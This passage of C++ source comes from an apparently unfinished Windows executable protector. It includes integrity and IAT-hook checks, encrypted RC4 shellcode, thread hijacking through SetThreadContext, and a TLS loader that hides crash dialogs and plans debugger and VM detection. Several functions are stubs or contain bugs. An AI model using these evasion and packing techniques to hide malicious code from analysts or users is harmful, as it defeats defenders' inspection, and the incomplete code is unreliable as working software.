	handle AddMemoryRegionExclusion(
		_In_ void*  VirtualAddress,
		_In_ size_t RegionSize
	) {
		HeapLock(m_ExclusionList);
		auto Region = (MemoryRegion*)HeapAlloc(m_ExclusionList, 0, sizeof(MemoryRegion));
		*Region = { VirtualAddress, RegionSize };
		HeapUnlock(m_ExclusionList);
		return (handle)CodePointer((ptr)Region);
	}
	void RemoveMemoryRegionExclusion(
		_In_ handle MemoryExclusion
	) {
		HeapFree(m_ExclusionList, 0, (void*)CodePointer((poly)MemoryExclusion));
	}

private:
	status SearchListForExclusion(
		_In_      void*          VirtualAddress,
		_In_      size_t         RegionSize,
		_Out_opt_ MemoryRegion*& Region
	) {
		PROCESS_HEAP_ENTRY HeapEntry;
		HeapEntry.lpData = nullptr;

		HeapLock(m_ExclusionList);
		while (HeapWalk(m_ExclusionList, &HeapEntry))
			if (HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
				Region = (MemoryRegion*)HeapEntry.lpData;

				// Check if the region searched for is within an exclusion
				if (Region->VirtualAddress < VirtualAddress &&
					(ptr)Region->VirtualAddress + Region->RegionSize > (ptr)VirtualAddress + RegionSize) {
					HeapUnlock(m_ExclusionList);
					return SUCCESS;
				}
			}
		HeapUnlock(m_ExclusionList);

		if (GetLastError() != ERROR_NO_MORE_ITEMS)
			return S_CREATE(SS_ERROR, SF_CORE, SC_UNKNOWN);
		return S_CREATE(SS_WARNING, SF_CORE, SC_NOT_FOUND);
	}

	handle m_ExclusionList;
};
handle MemScan;

void SetupMemoryScanner() {
	auto mscan = new MemoryScan;
	MemScan = (MemoryScan*)CodePointer((ptr)mscan);
	status s;

	// Add all loaded modules to exclusion list
	// TODO: only add executable sections
	auto InMemoryOrderModuleList = ldr::GetModuleList();
	auto ListIterator = InMemoryOrderModuleList;
	while (ListIterator->Flink != InMemoryOrderModuleList) {
		ListIterator = ListIterator->Flink;

		auto VirtualAddress = (void*)((ptr)ListIterator + 0x20);
		auto RegionSize = (size_t)((ptr)ListIterator + 0x30);
		mscan->AddMemoryRegionExclusion(VirtualAddress, RegionSize);
	}

	// Add memoryscanner-services (Thunks for servicemanager)
	ServiceManager->RegisterServiceFunction(N_ADDEXCLUS, [](
		_In_ poly MemoryRegion
		) {
			auto mr = (poly*)MemoryRegion;
			return (poly)((MemoryScan*)CodePointer((ptr)MemScan))->
				AddMemoryRegionExclusion((void*)mr[0], (size_t)mr[1]);
		});
	ServiceManager->RegisterServiceFunction(N_REMEXCLUS, [](
		_In_ poly ExclusionReference
		) -> poly {
			((MemoryScan*)CodePointer((ptr)MemScan))->
				RemoveMemoryRegionExclusion(*(handle*)ExclusionReference);
			return 0;
		});
	ServiceManager->RegisterServiceFunction(N_SCANVASPC, [](
		poly Unused
		) -> poly {
			return ((MemoryScan*)CodePointer((ptr)MemScan))->ScanVirtualMemory();
		});

	// Test scan memory
	s = mscan->ScanVirtualMemory();
}
#pragma endregion

#pragma region MemoryIntegrity
class IntegrityScan {
	struct MemoryRegion {
		void* VirtualAddress;
		size_t RegionSize;
	};

public:
	IntegrityScan() {
		m_ExclusionList = HeapCreate(null, HEAP_GENERATE_EXCEPTIONS, 0);
	}
	~IntegrityScan() {
		HeapDestroy(m_ExclusionList);
	}


#define CI_DONT_BREAK_OUT_ON_ERROR  0x00000001 // continues on normaly but increments a internal counter for raised suspicions
#define CI_VERIFY_VIRTUALSECTIONEND 0x00000002 // verifies that the data behind the virtual end of the section is zeropadded (prevent hijacking)
#define CI_COMPARE_WITH_DISKIMAGE   0x00000004 // Compares the section in memory with the section of the file on disk (file associated by Module)
#define CI_RELOCATE_IMAGE_TO_BASE   0x00000008 // function will relocate the section to the default loadaddress and reapply relocs when finished
#define CI_OUT_OF_PLACE_VALIDATION  0x00000010 // prevents the function from doing shit that would modify data inplace
#define CI_IGNORE_EXCLUDED_REGIONS  0x00000020 // uses the exclusion list in order to avoid hashing data that might have been modified
#define CI_
	status CheckIntegrityOfSection(
		_In_     handle               Module,
		_In_     IMAGE_SECTION_HEADER Section,
		_In_     u64& Hash,
		_In_opt_ u32                  Options
	) {
		auto SuspiciousDataCounter = 0;
		status ReturnValue = SUCCESS;

		auto Address = (void*)((ptr)Section.VirtualAddress + (ptr)Module);
		size_t SectionSize = Section.Misc.VirtualSize;



		if (Options & CI_DONT_BREAK_OUT_ON_ERROR && SuspiciousDataCounter)
			return S_CREATEM(SuspiciousDataCounter);
		return SUCCESS;
	}



	handle AddMemoryRegionExclusion(
		_In_ void* VirtualAddress,
		_In_ size_t RegionSize
	) {
		HeapLock(m_ExclusionList);
		auto Region = (MemoryRegion*)HeapAlloc(m_ExclusionList, 0, sizeof(MemoryRegion));
		*Region = { VirtualAddress, RegionSize };
		HeapUnlock(m_ExclusionList);
		return (handle)CodePointer((ptr)Region);
	}
	void RemoveMemoryRegionExclusion(
		_In_ handle MemoryExclusion
	) {
		HeapFree(m_ExclusionList, 0, (void*)CodePointer((poly)MemoryExclusion));
	}

private:
	status ValidateSectionEnd(
		_In_ handle               Module,
		_In_ IMAGE_SECTION_HEADER Section

	) {
		auto Address = (void*)((ptr)Section.VirtualAddress + (ptr)Module);
		size_t SectionSize = Section.Misc.VirtualSize;

		// Check there hasnt been attached more data after the virtual end of the section
		auto SectionVirtualEnd = (byte*)((ptr)Address + SectionSize);
		auto SectionEnd = (byte*)utl::RoundUpToMulOfPow2((u64)SectionVirtualEnd, PAGE_SIZE);

		while (SectionVirtualEnd < SectionEnd)
			// Checks if byte is not null
			if (*SectionVirtualEnd++) {
				TracePoint(DBG_WARNING, "Suspicious byte found after virtual section end:\n0x%016llx [0x%02x]",
					SectionVirtualEnd - 1, *(SectionVirtualEnd - 1));
				return S_CREATE(SS_WARNING, SF_CORE, SC_UNKNOWN_DATA_FOUND);
			}
	}



	status SearchListForNearestExclusion(    // Searches the exclusionlist for the nearest memory region
											 // starting from VirtualAddress with in the specified region
		_In_  void*          VirtualAddress, // the start of the region to search
		_In_  size_t         RegionSize,     // the size of the region to search
		_Out_ MemoryRegion*& Region          // RefToPointer to be set to the nearest found region
											 // (set to 0 if no element was found)
	) {
		PROCESS_HEAP_ENTRY HeapEntry;
		HeapEntry.lpData = nullptr;
		Region = nullptr;

		HeapLock(m_ExclusionList);
		while (HeapWalk(m_ExclusionList, &HeapEntry))
			if (HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
				MemoryRegion* RegionEntry = (MemoryRegion*)HeapEntry.lpData;

				// Check if the region searched for is within an exlcusion
				if (RegionEntry->VirtualAddress < VirtualAddress &&
					(ptr)RegionEntry->VirtualAddress + RegionEntry->RegionSize >(ptr)VirtualAddress + RegionSize) {

					// Check if region is the closest to the currect location (VirtualAddress)
					if (!Region)
						Region = RegionEntry;
					else if ((ptr)RegionEntry->VirtualAddress - (ptr)VirtualAddress <
						(ptr)Region->VirtualAddress - (ptr)VirtualAddress)
						Region = RegionEntry;
				}
			}
		HeapUnlock(m_ExclusionList);

		if (GetLastError() != ERROR_NO_MORE_ITEMS)
			return S_CREATE(SS_ERROR, SF_CORE, SC_UNKNOWN);
		if (!Region)
			return S_CREATE(SS_WARNING, SF_CORE, SC_NOT_FOUND);
		return SUCCESS;
	}

	handle m_ExclusionList;
};
#pragma endregion

status ValidateImportAddressTable( // Validates that the functionpointer thunks in the IAT actually point to the memory
                                   // inside the dll that is referenced by the import descriptor and therefor check if
                                   // if the IAT has been messed with like a IAT-Hook
	_In_ handle Module             // The Module whose IAT is to be validated for correctness
) {
	// Get start of importdata, aka the first import descriptor
	auto NtHeader = utl::GetNtHeader(Module);
	if (!NtHeader)
		return S_CREATE(SS_ERROR, SF_CORE, SC_INVALID_SIGNATURE);
	ptr BaseAddress = (ptr)Module;
	auto ImportDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)(
		NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + BaseAddress);

	auto SuspicousImportCounter = 0;

	// Iterate over all Dll imports
	while (ImportDescriptor->OriginalFirstThunk) {
		auto DllBaseName = (char*)((ptr)ImportDescriptor->Name + BaseAddress);
		auto NameLength = strlen(DllBaseName);

		handle LdrModule = null;
		size_t ModuleSize = 0;

		{	// Search for the Dll loaderdata inside the PEB
			auto InMemoryOrderModuleList = ldr::GetModuleList();
			auto ListIterator = InMemoryOrderModuleList;
			while (ListIterator->Flink != InMemoryOrderModuleList) {
			NextIteration:
				ListIterator = ListIterator->Flink;
				auto LdrDllName = (UNICODE_STRING*)((ptr)ListIterator + 0x48); // Get DllBaseName

				if (LdrDllName->Length / 2 == NameLength) {
					for (auto i = 0; i < NameLength; i++)
						if (tolower((char)LdrDllName->Buffer[i]) != tolower(DllBaseName[i]))
							goto NextIteration;

					LdrModule = *(handle*)((ptr)ListIterator + 0x20); // Get DllBaseAddress
					ModuleSize = *(size_t*)((ptr)ListIterator + 0x30); // Get SizeOfImage
					break; // Breaks out of the loader module enumeration
				}
			}
		}

		// Check if All import thunks are within this module
		auto ImportAddressTable = (ptr*)(ImportDescriptor->FirstThunk + BaseAddress);
		for (auto i = 0; ImportAddressTable[i]; i++)
			// TODO/BUG: This condition fails if the imported function is a forwarder
			if (ImportAddressTable[i] <= (ptr)LdrModule ||
				ImportAddressTable[i] >= (ptr)LdrModule + ModuleSize) {
				// Perform reverse image search to validate wanted forwarder:
				// 1. Obtain info about the suspicous pointer (Name, and belonging module)
				// 2. Search for the export in the belonging module and check if addresses are equal

				auto ImportLookupTable = (u64*)(ImportDescriptor->OriginalFirstThunk + BaseAddress);
				void* Export;
				if (!(ImportLookupTable[i] & 1ull << 63))
					Export = (void*)((ImportLookupTable[i] + 2) + BaseAddress);
				else
					Export = (void*)ImportLookupTable[i];

				// TODO: use private GetProcAddress Implementation
				auto TargetFunction = (ptr)GetProcAddress((HMODULE)LdrModule, (LPCSTR)Export);
				if (TargetFunction == ImportAddressTable[i])
					continue;

				TracePoint(DBG_WARNING, "Suspicous Import found at: 0x016llx", ImportAddressTable[i]);
				SuspicousImportCounter++;
			}

		ImportDescriptor++;
	}

	if (SuspicousImportCounter)
		return S_CREATEM(SuspicousImportCounter);
	return SUCCESS;
}


#pragma region Rc4Mod
// FIX: this shellcode was incorrect at the time of compiling, has ot be replaced
// src\scs\rc4mod.c : this is still raw and has to be obfuscated (done by the builder)
EXTERN_C EXPORT u8 NbRc4ModShellCode[] = {
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x4C,
	0x89, 0x74, 0x24, 0x20, 0x55, 0x48, 0x8D, 0x6C, 0x24, 0xF0, 0x48, 0x81, 0xEC, 0x10, 0x01, 0x00,
	0x00, 0x4D, 0x8B, 0xD1, 0x49, 0x8B, 0xC1, 0x49, 0xC1, 0xEA, 0x19, 0x4D, 0x8B, 0xF0, 0x48, 0xC1,
	0xE8, 0x2A, 0x48, 0x8B, 0xF2, 0x33, 0xDB, 0x44, 0x88, 0x55, 0x00, 0x44, 0x8B, 0xDB, 0x88, 0x45,
	0x01, 0x48, 0x8B, 0xF9, 0x0F, 0x1F, 0x40, 0x00, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x41, 0x0F, 0xB6, 0xC2, 0x44, 0x88, 0x1C, 0x04, 0x41, 0xFF, 0xC3, 0x44, 0x0F, 0xB6, 0x55, 0x00,
	0x41, 0xFE, 0xC2, 0x44, 0x88, 0x55, 0x00, 0x41, 0x81, 0xFB, 0x00, 0x01, 0x00, 0x00, 0x7C, 0xE0,
	0x4D, 0x8B, 0xD1, 0x4C, 0x8D, 0x04, 0x24, 0x49, 0xC1, 0xEA, 0x21, 0x41, 0x81, 0xE2, 0xFF, 0x01,
	0x00, 0x00, 0x8B, 0xC3, 0x4D, 0x8D, 0x40, 0x01, 0x33, 0xD2, 0xFF, 0xC3, 0x41, 0xF7, 0xF2, 0x48,
	0x63, 0xC2, 0x42, 0x0F, 0xB6, 0x0C, 0x30, 0x41, 0x02, 0x48, 0xFF, 0x0F, 0xB6, 0x45, 0x01, 0x02,
	0xC1, 0x88, 0x45, 0x01, 0x41, 0x0F, 0xB6, 0x48, 0xFF, 0x0F, 0xB6, 0xC0, 0x86, 0x0C, 0x04, 0x41,
	0x88, 0x48, 0xFF, 0x81, 0xFB, 0x00, 0x01, 0x00, 0x00, 0x7C, 0xC7, 0x49, 0x8B, 0xC1, 0x49, 0x8B,
	0xC9, 0x48, 0xC1, 0xE9, 0x11, 0x48, 0xC1, 0xE8, 0x32, 0x44, 0x0F, 0xB6, 0xD1, 0x66, 0x45, 0x85,
	0xC9, 0x74, 0x3D, 0x0F, 0x1F, 0x40, 0x00, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x41, 0x02, 0xC2, 0x49, 0xFF, 0xC9, 0x88, 0x45, 0x00, 0x0F, 0xB6, 0xD0, 0x0F, 0xB6, 0x04, 0x14,
	0x02, 0xC2, 0x0F, 0xB6, 0xC8, 0x88, 0x4D, 0x01, 0x0F, 0xB6, 0x14, 0x14, 0x86, 0x14, 0x0C, 0x0F,
	0xB6, 0x45, 0x00, 0x88, 0x14, 0x04, 0x0F, 0xB6, 0x45, 0x00, 0x66, 0x45, 0x85, 0xC9, 0x75, 0xD0,
	0x4C, 0x8B, 0xC6, 0x49, 0xC1, 0xE8, 0x20, 0x41, 0x0F, 0xB7, 0xC8, 0x48, 0x03, 0xF9, 0x66, 0x45,
	0x85, 0xC0, 0x74, 0x39, 0x41, 0xB9, 0xFF, 0xFF, 0x00, 0x00, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
	0x41, 0x02, 0xC2, 0x88, 0x45, 0x00, 0x0F, 0xB6, 0xD0, 0x0F, 0xB6, 0x04, 0x14, 0x02, 0xC2, 0x0F,
	0xB6, 0xC8, 0x88, 0x4D, 0x01, 0x0F, 0xB6, 0x14, 0x14, 0x86, 0x14, 0x0C, 0x0F, 0xB6, 0x45, 0x00,
	0x88, 0x14, 0x04, 0x0F, 0xB6, 0x45, 0x00, 0x66, 0x45, 0x03, 0xC1, 0x75, 0xD3, 0x85, 0xF6, 0x74,
	0x56, 0x0F, 0x1F, 0x40, 0x00, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x41, 0x02, 0xC2, 0x48, 0x8D, 0x7F, 0x01, 0x88, 0x45, 0x00, 0x48, 0xFF, 0xCE, 0x0F, 0xB6, 0xD0,
	0x0F, 0xB6, 0x04, 0x14, 0x02, 0xC2, 0x0F, 0xB6, 0xC8, 0x88, 0x4D, 0x01, 0x0F, 0xB6, 0x14, 0x14,
	0x86, 0x14, 0x0C, 0x0F, 0xB6, 0x45, 0x00, 0x88, 0x14, 0x04, 0x0F, 0xB6, 0x55, 0x01, 0x0F, 0xB6,
	0x45, 0x00, 0x0F, 0xB6, 0x14, 0x14, 0x02, 0x14, 0x04, 0x0F, 0xB6, 0xCA, 0x0F, 0xB6, 0x14, 0x0C,
	0x30, 0x57, 0xFF, 0x85, 0xF6, 0x75, 0xB9, 0x4C, 0x8D, 0x9C, 0x24, 0x10, 0x01, 0x00, 0x00, 0x49,
	0x8B, 0x5B, 0x10, 0x49, 0x8B, 0x73, 0x18, 0x49, 0x8B, 0x7B, 0x20, 0x4D, 0x8B, 0x73, 0x28, 0x49,
	0x8B, 0xE3, 0x5D, 0xC3
};

/* Config Format:
   BBBBBBBB|BBBBBBBB | BBBBBBBBB | BBBBBBBB|BBBBBBBB | B | BBBBBBBBBBBBBBBB
   ctx.i :8 ctx.j :8 | keylen :9 | SBoxOff  OffsetBa |   | Zerorounds   :16

   Region Format:
   BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB | BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
   Offset relative to base      :32 | size of region               :32 */
#define CreateRc4Config(kl, i, j, Sbo, Ob, Zr)\
        (((u64)((kl) & 0x1ff) << 33) |\
        ((u64)((i) & 0xff) << 50) |\
        ((u64)((j) & 0xff) << 42) |\
        ((u64)((Sbo) & 0xff) << 25) |\
        ((u64)((Ob) & 0xff) << 17) |\
        ((u64)(Zr) & 0xffff))
#define CreateRc4Region(bo, rs)\
        (((u64)(bo) << 32) | (rs))

EXTERN_C EXPORT u64 NbRc4ModShellCodeKey = 0;
void Rc4Mod(

) {
	static volatile i32 rc4modscl = 0;

	// Unlock rc4mod Shellcode
	if (_InterlockedIncrement(&rc4modscl) == 1) {
		for (auto i = 0; i < sizeof(NbRc4ModShellCode); i++)
			NbRc4ModShellCode[i] = _rotl8(NbRc4ModShellCode[i], i & 0x3) ^ ((u8*)NbRc4ModShellCodeKey)[i & 0x7];
	}

	// cipher region
	typedef void(__x64call* rc4mod)( // Crypts a buffer with RC4 cipher (RC4 modification)
		_Inout_ void* Buffer,        // The input data to be crypted
		_In_    u64   Region,        // The area of the input to be ciphered
		_In_    void* Key,           // The key to be used in the encryption
		_In_    u64   Config         // describes how the algorithim is scheduled
		);

	// TODO: continue here




	// Lock rc4mod shellcode
	if (!_InterlockedDecrement(&rc4modscl)) {
		for (auto i = 0; i < sizeof(NbRc4ModShellCode); i++)
			NbRc4ModShellCode[i] = _rotr8(NbRc4ModShellCode[i] ^ ((u8*)NbRc4ModShellCodeKey)[i & 0x7], i & 0x3);
	}
}


#pragma endregion

DEPRECATED_STR("has been replaced by new 3 level ring system")
class InSectionProtector {
public:
	InSectionProtector(                    // Sets up the IPS service
		_In_ handle                Module, // The module that is associated to the section
		_In_ IMAGE_SECTION_HEADER& Section // The intermediate protected section to be registered
	) : m_Module(Module),
		m_Section(m_Section) {
		EncryptSection();
	}
	~InSectionProtector() { // Removes the IPS service
		if (m_CryptoEngine)
			delete m_CryptoEngine;
	}

	void DestroySection() { // Erases the section from memory permanently and destroyes
		RtlSecureZeroMemory((void*)(m_Section.VirtualAddress + (ptr)m_Module), m_Section.Misc.VirtualSize);
		if (m_CryptoEngine)
			delete m_CryptoEngine;
	}

	status DecryptSection() {
		AcquireSRWLockExclusive(&m_Lock);
		auto Value = _InterlockedIncrement(&m_DecryptedCounter);
		if (Value == 0) // Check for imporper usage (Lock will not be unlocked and API will therefore block on the next call)
			return S_CREATE(SS_ERROR, SF_CORE, SC_COUNTER_CORRUPTED);

		if (Value == 1) {
			auto Section = (void*)(m_Section.VirtualAddress + (ptr)m_Module);
			// m_CryptoEngine->crypt(Section, m_Section.Misc.VirtualSize, Section);
			delete m_CryptoEngine;
			m_CryptoEngine = nullptr;
		}

		ReleaseSRWLockExclusive(&m_Lock);
		return SUCCESS;
	}
	status EncryptSection() {
		AcquireSRWLockExclusive(&m_Lock);
		auto Value = _InterlockedDecrement(&m_DecryptedCounter);
		if (Value == -1ul) // Check for imporper usage (same as above)
			return S_CREATE(SS_ERROR, SF_CORE, SC_COUNTER_CORRUPTED);

		if (!Value) {
			// Create new provider with random key
			m_CryptoEngine = nullptr; // new rc4;
			u32 RtlState;
			byte RandomKey[256];
			for (auto i = 0; i < 256 / 4; i++)
				((u32*)RandomKey)[i] = RtlRandomEx(&RtlState);
			// m_CryptoEngine->ksa(RandomKey, 256);

			// Encrypt section and reschedule/reset key
			auto Section = (void*)(m_Section.VirtualAddress + (ptr)m_Module);
			// m_CryptoEngine->crypt(Section, m_Section.Misc.VirtualSize, Section);
			// m_CryptoEngine->ksa(RandomKey, 256);
		}

		ReleaseSRWLockExclusive(&m_Lock);
		return SUCCESS;
	}

private:
	const    handle                m_Module;
	const    IMAGE_SECTION_HEADER& m_Section;
	volatile u32                   m_DecryptedCounter = 0; // tracks the amount of decryption requests,
	                                                       // every decryption call must be matched by a encrypt call,
	                                                       // failing to do so will result in an error or leave the section readable.
	SRWLOCK m_Lock = SRWLOCK_INIT;                         // Cryptolock for thread safety
	u64*    m_CryptoEngine = nullptr;                      // rc4 crypto engine
};

class PageGuard {
	struct MemoryRegion {
		void*  VirtualAddress;
		size_t RegionSize;
	};

public:
	PageGuard()
	  : m_GuardPageList(DecodePointer(g_.NebulaHeap)),
		m_GuardCodeList(DecodePointer(g_.NebulaHeap)) {}

	status RegisterGuardedMemory(
		_In_ void* VirtualAddress,
		_In_ size_t RegionSize
	) {

	}
	status RegisterAllowedCode(
		_In_ void*  VirtualAddress,
		_In_ size_t RegionSize
	) {

	}


private:

	DoublyLinkedList m_GuardPageList;
	DoublyLinkedList m_GuardCodeList;
};
```

`src/riftldr/core.cpp`:

```cpp
#include "ldr.h"

#pragma region ServiceCenter
svc2::svc2() {
	m_DispatchTable = HeapCreate(null, HEAP_GENERATE_EXCEPTIONS, 0);
}
svc2::~svc2() {
	HeapDestroy(m_DispatchTable);
}

status svc2::SearchListForEntry(
	_In_  u64                     ServiceId,
	_Out_ FunctionDispatchEntry*& FunctionEntry
) {
	PROCESS_HEAP_ENTRY HeapEntry;
	HeapEntry.lpData = nullptr;

	HeapLock(m_DispatchTable);
	while (HeapWalk(m_DispatchTable, &HeapEntry))
		if (HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
			FunctionEntry = (FunctionDispatchEntry*)HeapEntry.lpData;
			if (FunctionEntry->FunctionId == ServiceId) {
				HeapUnlock(m_DispatchTable);
				return SUCCESS;
			}
		}
	HeapUnlock(m_DispatchTable);

	FunctionEntry = nullptr;
	if (GetLastError() != ERROR_NO_MORE_ITEMS)
		return S_CREATE(SS_ERROR, SF_CORE, SC_UNKNOWN);
	return S_CREATE(SS_WARNING, SF_CORE, SC_NOT_FOUND);
}

status svc2::RegisterServiceFunction(
	_In_ u64                    FunctionId,
	_In_ ServiceFunctionPointer FunctionPointer
) {
	HeapLock(m_DispatchTable);

	// Test if ServiceId has been used already
	FunctionDispatchEntry* Entry;
	status Status = SearchListForEntry(FunctionId, Entry);
	if (S_CODE(Status) != SC_NOT_FOUND) {
		HeapUnlock(m_DispatchTable);
		return S_CREATE(SS_ERROR, SF_CORE, SC_ALREADY_EXISTS);
	}
	Status = SUCCESS;

	auto ServiceEntry = (FunctionDispatchEntry*)HeapAlloc(m_DispatchTable, 0, sizeof(FunctionDispatchEntry));

	// Associate Function to Module
	MEMORY_BASIC_INFORMATION mbi;
	VirtualQuery(FunctionPointer, &mbi, sizeof(mbi));
	void* ModuleBase = mbi.AllocationBase;
	if (*(word*)ModuleBase == IMAGE_DOS_SIGNATURE)
		ServiceEntry->ModuleAssociation = ModuleBase;
	else {
		ServiceEntry->ModuleAssociation = nullptr;
		Status = S_CREATE(SS_WARNING, SF_CORE, SC_SEARCH_UNSUCCESSFUL);
	}

	// Register function
	ServiceEntry->FunctionId = FunctionId;
	ServiceEntry->FunctionPointer = (ServiceFunctionPointer)CodePointer((ptr)FunctionPointer);
	HeapUnlock(m_DispatchTable);
	return Status;
}

status svc2::ServiceCall(            // Calls the requested servicefunction
	_In_      u64   ServiceId,        // identifier for the servicefunction
	_Out_opt_ poly* ReturnValue,      // the result returned by the servicefunction
	_In_opt_  poly  ServiceParameters // A polymorpthic value to be passed throuh
) {
	// Search for Servicefunction and get its entry
	FunctionDispatchEntry* Entry;
	auto Status = SearchListForEntry(ServiceId, Entry);
	if (!S_SUCCESS(Status))
		return Status;

	// Call servicefunction and mutate pointer
	auto ServiceFunction = (ServiceFunctionPointer)CodePointer((poly)Entry->FunctionPointer);
	*ReturnValue = ServiceFunction(ServiceParameters);
	_InterlockedExchange64((long long*)&Entry->FunctionPointer, CodePointer((poly)ServiceFunction));

	return SUCCESS;
}
#pragma endregion

#pragma region ThreadInterruptService
extern "C" void ThreadInterruptDispatcher();
// rsp -> Stack layout:
//  | [16-Byte Free]
//  | [UserCallback]
//  | [UserContext]
//  | [ThreadContext]
//  | [RtlBarrier]
//  | ----------------
//  V [RestoreContext]

// As this function/feature is not perfect you should think about how and where you use it
// the reason for this is because of how syscalls work and you cant exactly hijack control of a context,
// that is currently in kernel mode, the behaviour of how SetThreadContext works gets really quirky here.
// This functions partially gets around that by saving the returnvalue in the context to restore,
// this may not work perfectly tho, but should be fine as long as everything sticks to the x64 calling convention,
// which all Windows API's and specifically in this case, all syscall's do. I might be wrong tho...

// IMPROVMMENT: provide all thread interrupts and single thread interrupts
// IMPROVEMENT: Use Event Objects instead for Waitfunctions to allow for timeouts
status InterruptThread(                // Interrupts the execution flow of a thread and runs a callback on it by hijacking control
	_In_     HANDLE       Thread,      // Thread to interrupt
	_In_     tapc_t       Callback,    // UserThread InterruptServiceRoutine (ISR)
	_In_opt_ poly         UserContext, // User defined context for callback
	_In_opt_ RTL_BARRIER* RtlBarrier   // Dispatcher will signal this object after the callback ran
) {
	if (SuspendThread(Thread) == -1)
		return S_CREATE(SS_ERROR, SF_CORE, SC_INSUFFICIENT);
	CONTEXT OldContext = { 0 };
	OldContext.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(Thread, &OldContext)) {
		ResumeThread(Thread);
		return S_CREATE(SS_ERROR, SF_CORE, SC_INSUFFICIENT);
	}

	// Allocate context on threadstack (align to 16 bytes)
	CONTEXT NewContext;
	NewContext.ContextFlags = CONTEXT_CONTROL;                   // only set control regs
	NewContext.SegSs = OldContext.SegSs;                         // take over previous context control
	NewContext.SegCs = OldContext.SegCs;
	NewContext.EFlags = OldContext.EFlags;
	NewContext.Rsp = OldContext.Rsp & ~0xf;                      // align Stack to 16bytes
	NewContext.Rsp -= sizeof(CONTEXT);                           // allocate context
	memcpy((void*)NewContext.Rsp, &OldContext, sizeof(CONTEXT)); // copy state to be restored

	// Allocate shadowspace and set function arguments
	NewContext.Rsp -= 0x30;
	((tapc_t*)NewContext.Rsp)[2] = Callback;
	((poly*)NewContext.Rsp)[3] = UserContext;
	((u64*)NewContext.Rsp)[4] = NewContext.Rsp + 0x30;
	((RTL_BARRIER**)NewContext.Rsp)[5] = RtlBarrier;

	// Commit transaction and run ISR
	NewContext.Rip = (ptr)ThreadInterruptDispatcher;
	if (!SetThreadContext(Thread, &NewContext)) {
		ResumeThread(Thread);
		return S_CREATE(SS_ERROR, SF_CORE, SC_INSUFFICIENT);
	}
	if (ResumeThread(Thread) == -1) // cannot Resume Thread
		return S_CREATE(SS_ERROR, SF_CORE, SC_CRITICAL_FAILURE);

	// Wait until all ISR's executed, if synchronized and return
	if (RtlBarrier)
		EnterSynchronizationBarrier(RtlBarrier, 0);

	// Check if all threads are
	u32 ExitCode;
	GetExitCodeThread(Thread, &ExitCode);
	if (ExitCode != STATUS_PENDING) // thread terminated (caller must verify if the termination was caused by this function)
		return ExitCode;
	return 0;
}

status AbortThreadInterrupt( // Will try to reset the thread and abort the scheduled interrupt forcefully
							 // (The Dispatcher must not have executed yet, else it will result in a corrupted thread)
	_In_ handle Thread       // The thread of which the sheduled Callback should be aborted
) {
	// Get control context
	if (SuspendThread(Thread) == -1)
		return S_CREATE(SS_ERROR, SF_CORE, SC_INSUFFICIENT);
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_CONTROL;
	if (!GetThreadContext(Thread, &ThreadContext)) {
		ResumeThread(Thread);
		return S_CREATE(SS_ERROR, SF_CORE, SC_CRITICAL_FAILURE);
	}

	// Get restore point
	auto Context = (CONTEXT*)(ThreadContext.Rsp + 0x30);
	Context->ContextFlags = CONTEXT_CONTROL;
	if (!SetThreadContext(Thread, Context)) {
		ResumeThread(Thread);
		return S_CREATE(SS_ERROR, SF_CORE, SC_CRITICAL_FAILURE);
	}
	if (ResumeThread(Thread) == -1) // cannot Resume Thread
		return S_CREATE(SS_ERROR, SF_CORE, SC_CRITICAL_FAILURE);

	return SUCCESS; // Assume successful abortion
}
#pragma endregion

#pragma region Startup-Loader
/* Thread-Local-Storage (TLS) Callback :
   This will start the Protection-Services,
   decrypt and unpack the actuall code
   and ensure code integrity. */
void __stdcall NebulaTlsEntry(
	_In_ void* DllHandle,
	_In_ u32   dwReason,
	_In_ void* Reserved
) {
	UNREFERENCED_PARAMETER(DllHandle);
	UNREFERENCED_PARAMETER(Reserved);

	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		{
			// TODO: Read Baseaddress from Peb Directly
			auto BaseAddress = (handle)GetModuleHandleW(nullptr);

			auto Status = ValidateImportAddressTable(BaseAddress);
			auto* NtHeader = utl::GetNtHeader(BaseAddress);

		#ifndef _DEBUG
			// Prevent rrror popups, we dont wanna let the user know if we crashed
			SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
		#endif

			// Setup ProcessCookie (required for CodePointer)
			dword RtlState;
			_InterlockedExchange64((i64*)&g_.ProcessCookie, (u64)RtlRandomEx(&RtlState) << 32 | RtlRandomEx(&RtlState));
			_InterlockedExchange8((i8*)&g_.CookieOffset, RtlRandomEx(&RtlState) & 0x1f);

			// Initializing ServiceManager
			_InterlockedExchange64((i64*)&ServiceManager, (i64)new svc2);

			void SetupMemoryScanner();
			SetupMemoryScanner();


			poly Parameters[2];
			Parameters[0] = 23;
			Parameters[1] = 43;
			poly ret;
			auto a = ServiceManager->ServiceCall(0x21, &ret, (poly)Parameters);


			// Initialize

			/* Execution Plan:
			   1. Protect TLS (Stage-1):
				  - Hide Thread
				  - Basic debugger tests
				  - Check Systemcalls

			   2. Ensure integrity of the loaderstub (selfhashing (fnv1a64))

			   3. Start Protection-Services (Protect TLS Stage-2):
				  - MemoryScanner
				  - Test for Virtual Environment
				  - Run all Debugger Checks

			   4. Decrypt & unpack the core (per registered section):
				  - Undo Base-Relocations in region (fix corrupted data)
				  - Decrypt (rc4mod)
				  - Unpack (LZ77+Huffman (RtlDecompressBufferEx))
				  - Reapply Base-Relocations on section
				  - Ensure integrity of unpacked code/data (hashing (fnv1a64 per section))
			*/

